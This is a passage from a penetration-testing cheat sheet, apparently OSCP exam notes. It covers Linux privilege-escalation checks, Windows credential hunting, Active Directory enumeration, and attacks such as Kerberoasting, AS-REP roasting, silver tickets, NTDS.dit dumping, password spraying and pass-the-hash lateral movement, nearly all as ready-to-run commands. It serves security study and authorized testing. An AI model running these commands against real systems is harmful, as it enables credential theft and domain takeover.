</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">getcap -r / 2&gt;/dev/null
</span></span></code></pre></div><h2 id="cron-jobs">Cron Jobs</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Detecting Cronjobs</span>
</span></span><span class="line"><span class="cl">cat /etc/crontab
</span></span><span class="line"><span class="cl">crontab -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pspy <span class="c1">#handy tool to live monitor stuff happening in Linux</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">grep <span class="s2">&#34;CRON&#34;</span> /var/log/syslog <span class="c1">#inspecting cron logs</span>
</span></span></code></pre></div><h2 id="nfs">NFS</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">##Mountable shares</span>
</span></span><span class="line"><span class="cl">cat /etc/exports <span class="c1">#On target</span>
</span></span><span class="line"><span class="cl">showmount -e &lt;target IP&gt; <span class="c1">#On attacker</span>
</span></span><span class="line"><span class="cl"><span class="c1">###Check for &#34;no_root_squash&#34; in the output of shares</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mount -o rw &lt;targetIP&gt;:&lt;share-location&gt; &lt;directory path we created&gt;
</span></span><span class="line"><span class="cl"><span class="c1">#Now create a binary there</span>
</span></span><span class="line"><span class="cl">chmod +x &lt;binary&gt;
</span></span></code></pre></div><hr>
<h1 id="post-exploitation">Post Exploitation</h1>
<blockquote>
<p>This is more Windows-specific as exam-specific.</p></blockquote>
<aside>
💡 Run WinPEAS.exe - This may give us some more detailed information as no, we’re a privileged user, and we can open several files, which gives us some edge!
</aside>
<h2 id="sensitive-information-1">Sensitive Information</h2>
<h3 id="powershell-history">Powershell History</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">type </span><span class="k">%</span><span class="n">userprofile</span><span class="p">%\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Example</span>
</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sathvik</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="py">txt</span> 
</span></span></code></pre></div><h3 id="searching-for-passwords">Searching for passwords</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">.</span><span class="py">s</span> <span class="p">*</span><span class="n">pass</span><span class="p">*</span> <span class="p">==</span> <span class="p">*.</span><span class="n">config</span>
</span></span><span class="line"><span class="cl"><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="p">*.</span><span class="n">xml</span> <span class="p">*.</span><span class="n">ini</span> <span class="p">*.</span><span class="n">txt</span>
</span></span></code></pre></div><h3 id="searching-in-registry-for-passwords">Searching in Registry for Passwords</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span> <span class="p">/</span><span class="n">f</span> <span class="n">password</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">s</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span> <span class="p">/</span><span class="n">f</span> <span class="n">password</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">s</span>
</span></span></code></pre></div><aside>
💡 Always check document folders, they may contain some juicy files
</aside>
<h3 id="kdbx-files">KDBX Files</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#These are KeyPassX password-stored files</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">b</span> <span class="p">*.</span><span class="n">kdbx</span> 
</span></span><span class="line"><span class="cl"><span class="n">Ps</span><span class="p">&gt;</span> <span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Filter</span> <span class="p">*.</span><span class="n">kdbx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Cracking</span>
</span></span><span class="line"><span class="cl"><span class="n">keepass2john</span> <span class="n">Database</span><span class="p">.</span><span class="py">kdbx</span> <span class="p">&gt;</span> <span class="n">keepasshash</span>
</span></span><span class="line"><span class="cl"><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">sathvik</span><span class="p">/</span><span class="n">Wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="py">txt</span> <span class="n">keepasshash</span>
</span></span></code></pre></div><h2 id="dumping-hashes">Dumping Hashes</h2>
<ol>
<li>Use Mimikatz</li>
<li>If this is a domain-joined machine, run BloodHound.</li>
</ol>
<hr>
<h1 id="active-directory-pentesting">Active Directory Pentesting</h1>
<aside>
💡 We perform the following stuff once we’re in the AD network
</aside>
<h2 id="enumeration">Enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net localgroup Administrators <span class="c1">#to check local admins </span>
</span></span></code></pre></div><h3 id="powerview">Powerview</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span> <span class="c">#loading module to powershell, if it gives an error then change the execution policy</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetDomain</span> <span class="c">#basic information about the domain</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetUser</span> <span class="c">#list of all users in the domain</span>
</span></span><span class="line"><span class="cl"><span class="c"># The above command&#39;s outputs can be filtered using &#34;select&#34; command. For example, &#34;Get-NetUser | select cn&#34;, here cn is a sideheading for the output of the above command. we can select any number of them seperated by comma.</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetGroup</span> <span class="c"># enumerate domain groups</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetGroup</span> <span class="s2">&#34;group name&#34;</span> <span class="c"># information from specific group</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetComputer</span> <span class="c"># enumerate the computer objects in the domain</span>
</span></span><span class="line"><span class="cl"><span class="nb">Find-LocalAdminAccess</span> <span class="c"># scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetSession</span> <span class="n">-ComputerName</span> <span class="n">files04</span> <span class="n">-Verbose</span> <span class="c">#Checking logged on users with Get-NetSession, adding verbosity gives more info.</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span> <span class="c"># Listing SPN accounts in domain</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="c"># enumerates ACE(access control entities), lists SID(security identifier). ObjectSID</span>
</span></span><span class="line"><span class="cl"><span class="nb">Convert-SidToName</span> <span class="p">&lt;</span><span class="n">sid</span><span class="p">/</span><span class="n">objsid</span><span class="p">&gt;</span> <span class="c"># converting SID/ObjSID to name </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Checking for &#34;GenericAll&#34; right for a specific group, after obtaining they can be converted using convert-sidtoname</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-ObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&#34;group-name&#34;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">ActiveDirectoryRights</span> <span class="o">-eq</span> <span class="s2">&#34;GenericAll&#34;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ActiveDirectoryRights</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Find-DomainShare</span> <span class="c">#find the shares in the domain</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-verbose</span> <span class="c"># identifying AS-REP roastable accounts</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">select </span><span class="n">serviceprincipalname</span> <span class="c">#Kerberoastable accounts</span>
</span></span></code></pre></div><h3 id="bloodhound">Bloodhound</h3>
<ul>
<li>Collection methods - database</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Sharphound - transfer sharphound.ps1 into the compromised machine</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Sharphound</span><span class="p">.</span><span class="py">ps1</span> 
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">location</span><span class="p">&gt;</span> <span class="n">-OutputPrefix</span> <span class="s2">&#34;name&#34;</span> <span class="c"># collects and saved with the specified details, output will be saved in windows compromised machine</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Bloodhound-Python</span>
</span></span><span class="line"><span class="cl"><span class="nb">bloodhound-python</span> <span class="n">-u</span> <span class="s1">&#39;uname&#39;</span> <span class="n">-p</span> <span class="s1">&#39;pass&#39;</span> <span class="n">-ns</span> <span class="p">&lt;</span><span class="n">rhost</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="nb">domain-name</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="n">all</span> <span class="c">#output will be saved in you kali machine</span>
</span></span></code></pre></div><ul>
<li>Running Bloodhound</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">neo4j</span> <span class="n">console</span>
</span></span><span class="line"><span class="cl"><span class="c"># then upload the .json files obtained</span>
</span></span></code></pre></div><h3 id="ldapdomaindump">LDAPDOMAINDUMP</h3>
<ul>
<li>These files contain information in a well-structured webpage format.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ldapdomaindump ldaps://&lt;IP&gt; -u <span class="s1">&#39;username&#39;</span> -p <span class="s1">&#39;password&#39;</span> <span class="c1">#Do this in a new folder</span>
</span></span></code></pre></div><h3 id="plumhound">PlumHound</h3>
<ul>
<li>Link: <a href="https://github.com/PlumHound/PlumHound">https://github.com/PlumHound/PlumHound</a> install from the steps mentioned.</li>
<li>Keep both Bloodhound and Neo4j running as this tool acquires information from them.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 plumhound.py --easy -p &lt;neo4j-password&gt; <span class="c1">#Testing connection</span>
</span></span><span class="line"><span class="cl">python3 PlumHound.py -x tasks/default.tasks -p &lt;neo4jpass&gt; <span class="c1">#Open index.html as once this command is completed it produces somany files</span>
</span></span><span class="line"><span class="cl">firefox index.html
</span></span></code></pre></div><h3 id="pingcastle">PingCastle</h3>
<ul>
<li><a href="http://www.pingcastle.com">www.pingcastle.com</a> - Download Zip file from here.</li>
<li>This needs to be run on windows machine, just hit enter and give the domain to scan.</li>
<li>It gives a report at the end of the scan.</li>
</ul>
<h3 id="psloggedon">PsLoggedon</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># To see user logons at remote system of a domain(external tool)</span>
</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">PsLoggedon</span><span class="p">.</span><span class="py">exe</span> <span class="p">\\&lt;</span><span class="n">computername</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="gpp-or-cpassword">GPP or CPassword</h3>
<ul>
<li>Impacket</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># with a NULL session</span>
</span></span><span class="line"><span class="cl">Get-GPPPassword.py -no-pass <span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># with cleartext credentials</span>
</span></span><span class="line"><span class="cl">Get-GPPPassword.py <span class="s1">&#39;DOMAIN&#39;</span>/<span class="s1">&#39;USER&#39;</span>:<span class="s1">&#39;PASSWORD&#39;</span>@<span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># pass-the-hash (with an NT hash)</span>
</span></span><span class="line"><span class="cl">Get-GPPPassword.py -hashes :<span class="s1">&#39;NThash&#39;</span> <span class="s1">&#39;DOMAIN&#39;</span>/<span class="s1">&#39;USER&#39;</span>:<span class="s1">&#39;PASSWORD&#39;</span>@<span class="s1">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># parse a local file</span>
</span></span><span class="line"><span class="cl">Get-GPPPassword.py -xmlfile <span class="s1">&#39;/path/to/Policy.xml&#39;</span> <span class="s1">&#39;LOCAL&#39;</span>
</span></span></code></pre></div><ul>
<li>SMB share - If SYSVOL share or any share which <code>domain</code> name as folder name</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Download the whole share</span>
</span></span><span class="line"><span class="cl">https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
</span></span><span class="line"><span class="cl"><span class="c1">#Navigate to the downloaded folder</span>
</span></span><span class="line"><span class="cl">grep -inr <span class="s2">&#34;cpassword&#34;</span>
</span></span></code></pre></div><ul>
<li>Crackmapexec</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crackmapexec smb &lt;TARGET<span class="o">[</span>s<span class="o">]</span>&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; -M gpp_password
</span></span><span class="line"><span class="cl">crackmapexec smb &lt;TARGET<span class="o">[</span>s<span class="o">]</span>&gt; -u &lt;USERNAME&gt; -H LMHash:NTLMHash -d &lt;DOMAIN&gt; -M gpp_password
</span></span></code></pre></div><ul>
<li>Decrypting the CPassword</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gpp-decrypt <span class="s2">&#34;cpassword&#34;</span>
</span></span></code></pre></div><h2 id="attacking-active-directory"><strong>Attacking Active Directory</strong></h2>
<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>
<h3 id="zerologon">Zerologon</h3>
<ul>
<li><a href="https://github.com/VoidSec/CVE-2020-1472">Exploit</a></li>
<li>We can dump hashes on target even without any credentials.</li>
</ul>
<h3 id="password-spraying">Password Spraying</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Crackmapexec - check if the output shows &#39;Pwned!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">or</span> <span class="n">subnet</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="s1">&#39;pass&#39;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-continue-on-success</span> <span class="c">#use continue-on-success option if it&#39;s subnet</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Kerbrute</span>
</span></span><span class="line"><span class="cl"><span class="n">kerbrute</span> <span class="n">passwordspray</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="py">com</span> <span class="p">.\</span><span class="n">usernames</span><span class="p">.</span><span class="py">txt</span> <span class="s2">&#34;pass&#34;</span>
</span></span></code></pre></div><h3 id="as-rep-roasting">AS-REP Roasting</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">impacket-GetNPUsers</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="nb">DC-IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">pass</span><span class="p">&gt;</span> <span class="n">-request</span> <span class="c">#this gives us the hash of AS-REP Roastable accounts, from kali linux</span>
</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">nowrap</span> <span class="c">#dumping from compromised windows host</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-m</span> <span class="mf">18200</span> <span class="n">hashes</span><span class="p">.</span><span class="py">txt</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-force</span> <span class="c"># cracking hashes</span>
</span></span></code></pre></div><h3 id="kerberoasting">Kerberoasting</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">hashes</span><span class="p">.</span><span class="py">kerberoast</span> <span class="c">#dumping from compromised windows host, and saving with customname</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="nb">DC-IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">pass</span><span class="p">&gt;</span> <span class="n">-request</span> <span class="c">#from kali machine</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">hashcat</span> <span class="n">-m</span> <span class="mf">13100</span> <span class="n">hashes</span><span class="p">.</span><span class="py">txt</span> <span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-force</span> <span class="c"># cracking hashes</span>
</span></span></code></pre></div><h3 id="silver-tickets">Silver Tickets</h3>
<ul>
<li>Obtaining hash of an SPN user using <strong>Mimikatz</strong></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl"><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span> <span class="c">#obtain NTLM hash of the SPN account here</span>
</span></span></code></pre></div><ul>
<li>Obtaining Domain SID</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ps</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">user</span>
</span></span><span class="line"><span class="cl"><span class="c"># this gives SID of the user that we&#39;re logged in as. If the user SID is &#34;S-1-5-21-1987370270-658905905-1781884369-1105&#34; then the domain   SID is &#34;S-1-5-21-1987370270-658905905-1781884369&#34;</span>
</span></span></code></pre></div><ul>
<li>Forging silver ticket Ft <strong>Mimikatz</strong></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="p">&lt;</span><span class="n">domainSID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="nb">domain-name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">target</span><span class="err">:</span><span class="p">&lt;</span><span class="n">targetsystem</span><span class="p">.</span><span class="n">domain</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="p">&lt;</span><span class="nb">service-name</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="p">&lt;</span><span class="nb">NTLM-hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="nb">new-user</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># we can check the tickets by,</span>
</span></span><span class="line"><span class="cl"><span class="n">ps</span><span class="p">&gt;</span> <span class="n">klist</span>
</span></span></code></pre></div><ul>
<li>Accessing service</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ps</span><span class="p">&gt;</span> <span class="nb">iwr </span><span class="n">-UseDefaultCredentials</span> <span class="p">&lt;</span><span class="n">servicename</span><span class="p">&gt;</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">computername</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="secretsdump">Secretsdump</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">secretsdump</span><span class="p">.</span><span class="py">py</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">secretsdump</span><span class="p">.</span><span class="py">py</span> <span class="n">uname</span><span class="nv">@IP</span> <span class="n">-hashes</span> <span class="n">lmhash</span><span class="err">:</span><span class="n">ntlmhash</span> <span class="c">#local user</span>
</span></span><span class="line"><span class="cl"><span class="n">secretsdump</span><span class="p">.</span><span class="py">py</span> <span class="n">domain</span><span class="p">/</span><span class="n">uname</span><span class="nv">@IP</span> <span class="n">-hashes</span> <span class="n">lmhash</span><span class="err">:</span><span class="n">ntlmhash</span> <span class="c">#domain user</span>
</span></span></code></pre></div><h3 id="dumping-ntdsdit">Dumping NTDS.dit</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;IP&gt; -just-dc-ntlm
</span></span><span class="line"><span class="cl"><span class="c1">#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit</span>
</span></span></code></pre></div><h2 id="lateral-movement-in-active-directory">Lateral Movement in Active Directory</h2>
<h3 id="psexec---smbexec---wmiexec---atexec">psexec - smbexec - wmiexec - atexec</h3>
<ul>
<li>Here we can pass the credentials or even hash, depending on what we have</li>
</ul>
<blockquote>
<p><em>Always pass the full hash to these tools!</em></p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">psexec</span><span class="p">.</span><span class="py">py</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">password1</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c"># the user should have write access to Admin share then only we can get sesssion</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">psexec</span><span class="p">.</span><span class="py">py</span> <span class="n">-hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">5fbc3d5fec8206a30f4b6c473d68ae76</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">command</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="c">#we passed full hash here</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">smbexec</span><span class="p">.</span><span class="py">py</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">password1</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">smbexec</span><span class="p">.</span><span class="py">py</span> <span class="n">-hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">5fbc3d5fec8206a30f4b6c473d68ae76</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">command</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="c">#we passed full hash here</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">wmiexec</span><span class="p">.</span><span class="py">py</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">password1</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">wmiexec</span><span class="p">.</span><span class="py">py</span> <span class="n">-hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">5fbc3d5fec8206a30f4b6c473d68ae76</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">command</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="c">#we passed full hash here</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">atexec</span><span class="p">.</span><span class="py">py</span> <span class="n">-hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="err">:</span><span class="n">5fbc3d5fec8206a30f4b6c473d68ae76</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;@&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">command</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">#we passed full hash here</span>
</span></span></code></pre></div><h3 id="winrs">winrs</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">winrs</span> <span class="n">-r:</span><span class="p">&lt;</span><span class="n">computername</span><span class="p">&gt;</span> <span class="n">-u:</span><span class="p">&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-p:</span><span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="s2">&#34;command&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell</span>
</span></span><span class="line"><span class="cl"><span class="c"># run this on windows session</span>
</span></span></code></pre></div><h3 id="crackmapexec">crackmapexec</h3>
<ul>
<li>If stuck make use of <a href="https://www.crackmapexec.wiki/">Wiki</a></li>
</ul>
